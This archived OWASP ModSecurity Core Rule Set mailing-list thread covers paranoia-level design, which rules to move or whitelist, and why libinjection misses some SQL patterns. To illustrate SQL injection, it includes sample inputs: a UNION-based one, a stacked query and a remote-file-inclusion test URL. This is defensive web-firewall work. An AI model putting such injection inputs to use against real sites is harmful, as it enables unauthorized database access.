Message-ID: <20160210062942.GA8002@elias>

Wow!

You won me over. Your message summarizes all my uneasiness with the 0-40
idea, which I was not quite able to express but did not go away even
after it sounded like there was growing consensus for 0-40.

Let's stick with 0-4!

And if we ever need a bigger namespace, we can easily map 
0->0
1->10
2->20
3->30
4->40
in an early rule as the spaces are distinct where it matters.

Your proposed table looks like the missing core of the whole
core rules documentation. We totally need this and hopefully
the python bindings will help us come with this in an more or
less automatic manner (I knew they would be useful as soon as
I read about them).


Definitions and default value. I agree on the need for good
criteria for the individual levels. However, I think we are not
in a position to define the criteria as strictly as you do.

I have a criteria proposal in my blogpost too, but it is less
strict. I think we should introduce and paranoia mode and then
sharpen the criteria as me grow in experience.

With that being said, I still think that "1" should be the default
level and 80% of the existing rules in 3.0.0rc1 should remain
on this level. For the time being that is.

I would rather have too many false positives on a standard install
then a fatal false negative on the same install. Your criteria
make it look like a lot of the existing rules would land on level
1 and 2 while the default installation would set the level at
0.

This may have to do with my preference for the anomaly scoring
mode of ModSec, while the strict-blocking mode of operation
is be more likely to block on minimal indicators of an attack.

If we start at default level 1 and most rules on that level
(outside of the ~45 candidates which we will move to level 2-4).
We can then sharpen our toolset and keep a very close eye on
the rules in level 1 and their false positive rate. If we
learn that some rules never really trigger false positives,
then let's move them to 0. If there are rules, which happen
to trigger too many FPs, then we can we can shift them to
level 2. But I think this process will take a year or two
to play out. We need experience.

Best,

Christian


On Tue, Feb 09, 2016 at 09:05:34PM +0100, Walter Hop wrote:
> It?s a bit of a bikeshed subject, but I think a few levels is better. I think it would be a tricky future if we'd have to say things like: ?hmmm, this rule is too heavy for 10 but too light for 15, let?s put it at 13?. How would a novice user ever guess the effects? Most people will pick one number and then troubleshoot.
> 
> We are brainstorming a lot about rules and parameters but we don?t have consensus on definitions first. If we have an integer scale with so many levels it might be very hard to describe what happens at a level. If we have just a few levels, we can provide definitions. What about this:
> 
> paranoia level 0: we try blocking definite attacks with small chance of false positives (default)
> paranoia level 1: we will be strict about protocol anomalies, this might cause some special clients like loadbalancers and scanners to cause false positives
> paranoia level 2: we will start blocking on suspicious heuristics which aren?t indicative of a certain attack but can be suspicious (e.g. use of MANY special characters; low-value PHP keywords and OS commands)
> paranoia level 3: the CRS will apply stricter heuristics (e.g. use of SOME special characters)
> paranoia level 4: the CRS will be the most strict
> 
> Then, we could easily document and maintain our paranoia decisions.
> We could make a table like this, so sysadmins know exactly what is happening:
> 
> ruleId
> 0
> 1
> 2
> 3
> 4
> what would trigger?
> 920300
> allowed
> warning
> warning
> block
> block
> no Accept header
> 920350
> allowed
> warning
> warning
> block
> block
> Host is IP4 address
> 931130
> allowed
> allowed
> block
> block
> block
> /?url=http://example.com
> 9123456
> allowed
> allowed
> block on 40 chars
> block on 10 chars
> block on 1 char
> /?id=%00blah
> 
> This clarity is something you lose if you can go to 40 levels.
> 
> Cheers,
> WH
> 
> > On 08 Feb 2016, at 22:12, Christian Folini <christian.folini at netnea.com> wrote:
> > 
> > Thanks Chaim and Lukas!
> > 
> > I got positive feedback via private messages too.
> > 
> > The one question, where I am still unsure (and the
> > feedback / criticism is also split) is the question
> > of the good integer range for the paranoia level.
> > 0-4 or rather 0-40.
> > 
> > Still not sure.
> > 
> > Thoughts on this question are thus very welcome.
> > 
> > Ahoj,
> > 
> > Christian
> > 
> > 
> > On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:
> >> Good writeup Christian!
> >> 
> >> On 2/8/16, 2:59 AM,
> >> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> >> Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
> >> behalf of Lukas.Funk at united-security-providers.ch> wrote:
> >> 
> >>> Hi Christian and all,
> >>> 
> >>> I follow the discussion about the paranoia mode with great interest. I
> >>> think it could be a good starting point for ModSecurity users which do
> >>> not have the expert knowledge of the rules.
> >>> 
> >>> Looking at your proposed structure of the paranoia mode setup, I think
> >>> it's on a good track. The structure is easy to understand!
> >>> Unfortunately I can't comment the different rules, as I don't have much
> >>> experience with them.
> >>> 
> >>> Thanks to all of you putting such great effort to the CRS and I'm really
> >>> looking forward to version 3!
> >>> 
> >>> Cheers, Lukas
> >>> 
> >>> 
> >>>>> Dear all,
> >>>>> 
> >>>>> With the progress we are making on the rules front, it is time to talk
> >>>>> about
> >>>>> the way it could be implemented.
> >>>>> It's time for the show-me-the-code. He you go:
> >>>>> 
> >>>>> 
> >>>>> http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx23NXMA
> >>>>> 8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02%2f04
> >>>>> %2fowasp-modsecurity-core-rules-
> >>>>> paranoia-mode-mechanics-proposal/
> >>>>> 
> >>>>> Feedback welcome!
> >>>>> 
> >>>>> Christian
> >> 
> >> 
> >> ________________________________
> >> 
> >> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> >> _______________________________________________
> >> Owasp-modsecurity-core-rule-set mailing list
> >> Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> > 
> > -- 
> > mailto:christian.folini at netnea.com
> > http://www.christian-folini.ch
> > twitter: @ChrFolini
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> 
> -- 
> Walter Hop | PGP key: https://lifeforms.nl/pgp
> 

> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Wed Feb 10 06:36:10 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Wed, 10 Feb 2016 07:36:10 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
Message-ID: <20160210063610.GB8002@elias>

Hello again,

On Tue, Feb 09, 2016 at 10:29:54PM +0100, Walter Hop wrote:
> Well, such a tuning was just one proposal to reduce FP for non-paranoid users so it might tip the balance in favor of keeping the rule in base. (Moving it to paranoid is just one possible way to change the FP / protection balance)

That makes a lot of sense. I was not aware of this reasoning behind your
previous message. Thanks for making this clear.

> I?m not 100% sure we should go very far with whitelistings in the default set. But there is some precedent (excluding Google Analytics cookies, formerly also Piwik I think). The CRS does carve little holes sometimes in order to deal with reality of the current web and still be strict on the rest (while commercial WAFs are necessarily much less strict on this, since it causes them too many support calls).

Exactly.

> I would hate to see the rule totally disappear from base just on my one FP note though. Maybe more people can check their audit logs for the rule since it?s in CRSv2 too. It does rule out a lot of exploits on legacy / in house PHP apps and attackers try it daily. So it?s a hard call...

Let's keep it in the base / on the default paranoia level then. Adding the whitelisting you 
proposed does little harm and is in line with the UUID whitelisting No?l has developed
for 981173 (lately moved to 
https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode_Sibling_981173)

Cheers,

Christian

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Wed Feb 10 06:45:17 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Wed, 10 Feb 2016 07:45:17 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 960015 / 920300 and 960017 / 920350 (Header issues)
In-Reply-To: <20160202083257.GD29931@elias>
References: <20160202083257.GD29931@elias>
Message-ID: <20160210064517.GA8647@elias>

And here we go again.

It is obvious that I am the only one complaining about
960017 / 920350. So let's keep it in the default set of
rules.

I have not heard support for the same policy with regards
to 960015/920300. I take this as a conformation for the
idea to move this rule to the paranoia mode.

Unless I hear a sudden cry, I will thus update the wiki with these
decisions.

Ahoj,

Christian




On Tue, Feb 02, 2016 at 09:32:57AM +0100, Christian Folini wrote:
> Hello,
> 
> The discussion on these two rules can be combined, I think.
> 
> 2.2.X rule 960015 (3.0.0rc1 rule 920300) "Request Missing an
> Accept Header) is simple enough. Accept headers are mandatory
> thus a client request lacking an accept header is thus illegal.
> 
> The problem: A lack of accept headers is widespread and ModSecurity
> is not going to fix the internet. Instead, we are generating
> false positives and pester our clients (if we block them based on 
> this rule triggering).
> 
> Moving this false positives generator to the paranoia mode seems
> a good move. But your view might vary.
> 
> With 960017 / 920350 (Host header is a numeric IP address), 
> the situation is slightly different. We agree it is a frequent
> source of false positives, but Walter thinks it is not legitimate
> users that are affected, but mass scanners. In my experience
> it is load balancers and health checkers which fall into this
> category as well. And stopping scanners is possibly behind the
> scope of a ModSec Core Rules vanilla install.
> 
> So what do we do with this rule?
> 
> Ahoj,
> 
> Christian
> 
> -- 
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From mail at noelzindel.org  Wed Feb 10 07:36:51 2016
From: mail at noelzindel.org (=?utf-8?Q?No=C3=ABl_Zindel?=)
Date: Wed, 10 Feb 2016 08:36:51 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <20160210063610.GB8002@elias>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
Message-ID: <50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>

Hey there,

> On 10 Feb 2016, at 07:36, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Let's keep it in the base / on the default paranoia level then. Adding the whitelisting you
> proposed does little harm and is in line with the UUID whitelisting No?l has developed
> for 981173 (lately moved to
> https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode_Sibling_981173)

I was not following up on this branch of the conversation. But let me look into this to see if i can write out a whitelisting proposal.

Regards,
No?l

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 801 bytes
Desc: Message signed with OpenPGP using GPGMail
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160210/b1233c45/attachment-0001.pgp>

From christian.folini at netnea.com  Wed Feb 10 08:22:35 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Wed, 10 Feb 2016 09:22:35 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>
Message-ID: <20160210082235.GA11645@elias>

Cool. Thanks, No?l!

Christian

On Wed, Feb 10, 2016 at 08:36:51AM +0100, No?l Zindel wrote:
> Hey there,
> 
> > On 10 Feb 2016, at 07:36, Christian Folini <christian.folini at netnea.com> wrote:
> > 
> > Let's keep it in the base / on the default paranoia level then. Adding the whitelisting you
> > proposed does little harm and is in line with the UUID whitelisting No?l has developed
> > for 981173 (lately moved to
> > https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode_Sibling_981173)
> 
> I was not following up on this branch of the conversation. But let me look into this to see if i can write out a whitelisting proposal.
> 
> Regards,
> No?l
> 



> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


From hongpinglin at hotmail.com  Thu Feb 11 00:31:27 2016
From: hongpinglin at hotmail.com (Richard Lin)
Date: Thu, 11 Feb 2016 00:31:27 +0000
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern
In-Reply-To: <20160210082235.GA11645@elias>
References: <20160202080600.GA29931@elias>,
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>,
	<20160207192339.GB30297@elias>,
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>,
	<20160210063610.GB8002@elias>,
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>,
	<20160210082235.GA11645@elias>
Message-ID: <BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>

Hi folks, I just joined the lists one day ago. And would like to seek the opinions of dealing with a SQLI pattern verdict-ed differently between regex rules and libinjection.
http://test.com?id=select a from table b.
I did not make  SQLI "select a from table b" as URL encoded for easier discussion here.
Basically, libinjection does not consider this string as SQLI although its SQLI pattern is so obvious. Libinjection considers the SQL injections are typically in the context of 
                     select * from table where id =%input with or without injection%

>From libinjection point of view,  the input of "select a from table b" is unable to join the above statement with correct SQL syntax. But if we just use regex rules, this input is so easy to marked as SQLI. I would like to seek the opinion in this group.  Do you think the request as "http://test.com?id=select a from table b." would cause really SQL injection successful in SQL syntax in any site?
ThanksRichard 		 	   		  
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160211/3066bdfb/attachment.html>

From CSanders at trustwave.com  Thu Feb 11 02:51:44 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Thu, 11 Feb 2016 02:51:44 +0000
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI
 pattern
In-Reply-To: <BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>
	<20160210082235.GA11645@elias>
	<BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>
Message-ID: <D2E1611F.19E65%csanders@trustwave.com>

Hey Richard,
I've seen things CLOSE to this in production. Sites where they've attempted to use prepared statements to secure a location where the variable injected in a table name. Of course prepared statements are designed for this environment and will fail miserably. But this accounts for a situation where all of the following except the word select is true. Granted it's unusual.

From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>> on behalf of Richard Lin <hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>>
Date: Wednesday, February 10, 2016 at 7:31 PM
To: "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern

Hi folks, I just joined the lists one day ago. And would like to seek the opinions of dealing with a SQLI pattern verdict-ed differently between regex rules and libinjection.

http://test.com?id=select<http://scanmail.trustwave.com/?c=4062&d=pNy71nQ6my89hadbculWPuIrswrAlseaEkF1b2C_pA&s=5&u=http%3a%2f%2ftest%2ecom%3fid%3dselect> a from table b.

I did not make  SQLI "select a from table b" as URL encoded for easier discussion here.

Basically, libinjection does not consider this string as SQLI although its SQLI pattern is so obvious. Libinjection considers the SQL injections are typically in the context of


            select * from table where id =%input with or without injection%


>From libinjection point of view,  the input of "select a from table b" is unable to join the above statement with correct SQL syntax. But if we just use regex rules, this input is so easy to marked as SQLI. I would like to seek the opinion in this group.  Do you think the request as "http://test.com?id=select a from table b.<http://scanmail.trustwave.com/?c=4062&d=pNy71nQ6my89hadbculWPuIrswrAlseaEhJ6aGfioQ&s=5&u=http%3a%2f%2ftest%2ecom%3fid%3dselect%20a%20from%20table%20b>" would cause really SQL injection successful in SQL syntax in any site?

Thanks
Richard

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160211/720d6c54/attachment.html>

From hongpinglin at hotmail.com  Thu Feb 11 06:06:35 2016
From: hongpinglin at hotmail.com (Richard Lin)
Date: Thu, 11 Feb 2016 06:06:35 +0000
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI
 pattern
In-Reply-To: <D2E1611F.19E65%csanders@trustwave.com>
References: <20160202080600.GA29931@elias>,
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>,
	<20160207192339.GB30297@elias>,
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>,
	<20160210063610.GB8002@elias>,
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>,
	<20160210082235.GA11645@elias>
	<BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>,
	<D2E1611F.19E65%csanders@trustwave.com>
Message-ID: <BAY180-W91800DDAB02375AD1AE664BAA80@phx.gbl>

Thanks. Could you explain in more detail?
My understanding for SQL injection case is  that careless web developers take the web request parameters and add them to their "where clause".
So if the input is  '1 union select a from uid2" that would cause successful injection because the careless developer's SQL was modified from 
select * from User where id =  [ input] to select * from User where id = 1 union select a from uid2
In above case, the SQL statement was successfully modified with correct syntax. Thus I can accept this is a successful injection.
But if the input is "select a from uid2", then careless developers SQL is as:
select * from User where id = select a from uid2
The above SQL statement is not correct in syntax. So this injection will not be successful. Maybe due to this consideration, the libinjection does not consider input of "select a from uid2" is a SQL injection although its SQL pattern is so obvious.
Richard

From: CSanders at trustwave.com
To: hongpinglin at hotmail.com; owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern
Date: Thu, 11 Feb 2016 02:51:44 +0000






Hey Richard,
I?ve seen things CLOSE to this in production. Sites where they?ve attempted to use prepared statements to secure a location where the variable injected in a table name. Of course prepared statements are designed for this environment and will fail miserably.
 But this accounts for a situation where all of the following except the word select is true. Granted it?s unusual. 





From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of Richard Lin <hongpinglin at hotmail.com>

Date: Wednesday, February 10, 2016 at 7:31 PM

To: "owasp-modsecurity-core-rule-set at lists.owasp.org" <owasp-modsecurity-core-rule-set at lists.owasp.org>

Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern








Hi folks, I just joined the lists one day ago. And would like to seek the opinions of dealing with a SQLI pattern verdict-ed differently between regex rules and libinjection.



http://test.com?id=select a from table b.



I did not make  SQLI "select a from table b" as URL encoded for easier discussion here.



Basically, libinjection does not consider this string as SQLI although its SQLI pattern is so obvious. Libinjection considers the SQL injections are typically in the context of 



         
            select * from table where id =%input with or without injection%






>From libinjection point of view,  the input of "select a from table b" is unable to join the above statement with correct SQL syntax. But if we just use regex rules, this input is so easy to marked as SQLI. I would
 like to seek the opinion in this group.  Do you think the request as "http://test.com?id=select
 a from table b." would cause really SQL injection successful in SQL syntax in any site?



Thanks
Richard








This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information
 contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

 		 	   		  
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160211/7d243a95/attachment-0001.html>

From christian.folini at netnea.com  Thu Feb 11 07:20:07 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 11 Feb 2016 08:20:07 +0100
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI
 pattern
In-Reply-To: <BAY180-W91800DDAB02375AD1AE664BAA80@phx.gbl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>
	<20160210082235.GA11645@elias>
	<BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>
	<D2E1611F.19E65%csanders@trustwave.com>
	<BAY180-W91800DDAB02375AD1AE664BAA80@phx.gbl>
Message-ID: <20160211072007.GA1505@elias>

Richard,

You are on good tracks with your reasoning.

What LibInjection is doing is feeding your input string into an
sql parser and check if it results in a possible injection.

Obviously, your input string _is_ sql, which gives reason to
believe that libinjection is combining your string with 
predefined strings first. Much like you do in your message.

The problem is, that libinjection is underdocumented from a
technical viewpoint so all I am writing here is based on 
fairly highlevel presentations.

The takeaway for me is that not even libinjection is a silver
bullet. It catches a lot, but there are dark areas where
it has to be combined with regexes in a diverse approach.

Ahoj,

Christian







On Thu, Feb 11, 2016 at 06:06:35AM +0000, Richard Lin wrote:
> Thanks. Could you explain in more detail?
> My understanding for SQL injection case is  that careless web developers take the web request parameters and add them to their "where clause".
> So if the input is  '1 union select a from uid2" that would cause successful injection because the careless developer's SQL was modified from 
> select * from User where id =  [ input] to select * from User where id = 1 union select a from uid2
> In above case, the SQL statement was successfully modified with correct syntax. Thus I can accept this is a successful injection.
> But if the input is "select a from uid2", then careless developers SQL is as:
> select * from User where id = select a from uid2
> The above SQL statement is not correct in syntax. So this injection will not be successful. Maybe due to this consideration, the libinjection does not consider input of "select a from uid2" is a SQL injection although its SQL pattern is so obvious.
> Richard
> 
> From: CSanders at trustwave.com
> To: hongpinglin at hotmail.com; owasp-modsecurity-core-rule-set at lists.owasp.org
> Subject: Re: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern
> Date: Thu, 11 Feb 2016 02:51:44 +0000
> 
> 
> 
> 
> 
> 
> Hey Richard,
> I?ve seen things CLOSE to this in production. Sites where they?ve attempted to use prepared statements to secure a location where the variable injected in a table name. Of course prepared statements are designed for this environment and will fail miserably.
>  But this accounts for a situation where all of the following except the word select is true. Granted it?s unusual. 
> 
> 
> 
> 
> 
> From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of Richard Lin <hongpinglin at hotmail.com>
> 
> Date: Wednesday, February 10, 2016 at 7:31 PM
> 
> To: "owasp-modsecurity-core-rule-set at lists.owasp.org" <owasp-modsecurity-core-rule-set at lists.owasp.org>
> 
> Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern
> 
> 
> 
> 
> 
> 
> 
> 
> Hi folks, I just joined the lists one day ago. And would like to seek the opinions of dealing with a SQLI pattern verdict-ed differently between regex rules and libinjection.
> 
> 
> 
> http://test.com?id=select a from table b.
> 
> 
> 
> I did not make  SQLI "select a from table b" as URL encoded for easier discussion here.
> 
> 
> 
> Basically, libinjection does not consider this string as SQLI although its SQLI pattern is so obvious. Libinjection considers the SQL injections are typically in the context of 
> 
> 
> 
>          
>             select * from table where id =%input with or without injection%
> 
> 
> 
> 
> 
> 
> >From libinjection point of view,  the input of "select a from table b" is unable to join the above statement with correct SQL syntax. But if we just use regex rules, this input is so easy to marked as SQLI. I would
>  like to seek the opinion in this group.  Do you think the request as "http://test.com?id=select
>  a from table b." would cause really SQL injection successful in SQL syntax in any site?
> 
> 
> 
> Thanks
> Richard
> 
> 
> 
> 
> 
> 
> 
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information
>  contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> 
>  		 	   		  

> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From CSanders at trustwave.com  Thu Feb 11 13:28:40 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Thu, 11 Feb 2016 13:28:40 +0000
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI
 pattern
In-Reply-To: <BAY180-W91800DDAB02375AD1AE664BAA80@phx.gbl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>
	<20160210082235.GA11645@elias>
	<BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>
	<D2E1611F.19E65%csanders@trustwave.com>
	<BAY180-W91800DDAB02375AD1AE664BAA80@phx.gbl>
Message-ID: <D2E1F54E.19ECC%csanders@trustwave.com>

Hey Richard, first I'll echo what Christian said, but also what you have described is just a LIMITED case of SQL injection. SQL Injection can really deal with any area in which SQL may be introduced by an attacker and it will then be executed later. There is no need to limit this to a where clause. For instance it could be in a like clause, it could be the clause itself, it could be the statement (select for instance) etc. The underlying idea is that anywhere a user can control a SQL statement would be bad. In fairness to libinjection it isn't factoring in all these situations it is designed with parameters in mind and SQL injections more a kin to the type you are describing. This is why we leave in complex regex patterns as well that can detect SQL patterns like the one you have described.
Another situation where it would be valuable to detect such statements would be in the case of stacked sql queries. Although not all engines support it, in some you may so things like:

select * from User where id =  [ input] to select * from User where id = 1; select a from uid2

These are good questions and from these often we'll discover other facets of the problem or solutions we never thought of so please feel free to keep asking if you have any ideas or questions, or are unclear on something :)


From: Richard Lin <hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>>
Date: Thursday, February 11, 2016 at 1:06 AM
To: Chaim Sanders <csanders at trustwave.com<mailto:csanders at trustwave.com>>, "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: RE: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern

Thanks. Could you explain in more detail?

My understanding for SQL injection case is  that careless web developers take the web request parameters and add them to their "where clause".

So if the input is  '1 union select a from uid2" that would cause successful injection because the careless developer's SQL was modified from

select * from User where id =  [ input] to select * from User where id = 1 union select a from uid2

In above case, the SQL statement was successfully modified with correct syntax. Thus I can accept this is a successful injection.

But if the input is "select a from uid2", then careless developers SQL is as:

select * from User where id = select a from uid2

The above SQL statement is not correct in syntax. So this injection will not be successful. Maybe due to this consideration, the libinjection does not consider input of "select a from uid2" is a SQL injection although its SQL pattern is so obvious.

Richard


________________________________
From: CSanders at trustwave.com<mailto:CSanders at trustwave.com>
To: hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>; owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>
Subject: Re: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern
Date: Thu, 11 Feb 2016 02:51:44 +0000

Hey Richard,
I've seen things CLOSE to this in production. Sites where they've attempted to use prepared statements to secure a location where the variable injected in a table name. Of course prepared statements are designed for this environment and will fail miserably. But this accounts for a situation where all of the following except the word select is true. Granted it's unusual.

From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>> on behalf of Richard Lin <hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>>
Date: Wednesday, February 10, 2016 at 7:31 PM
To: "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern

Hi folks, I just joined the lists one day ago. And would like to seek the opinions of dealing with a SQLI pattern verdict-ed differently between regex rules and libinjection.

http://test.com?id=select<http://scanmail.trustwave.com/?c=4062&d=gqW81tQS5NH9eqBDC64SSq9tMwG8F036fir7YXjliw&s=5&u=http%3a%2f%2ftest%2ecom%3fid%3dselect> a from table b.

I did not make  SQLI "select a from table b" as URL encoded for easier discussion here.

Basically, libinjection does not consider this string as SQLI although its SQLI pattern is so obvious. Libinjection considers the SQL injections are typically in the context of


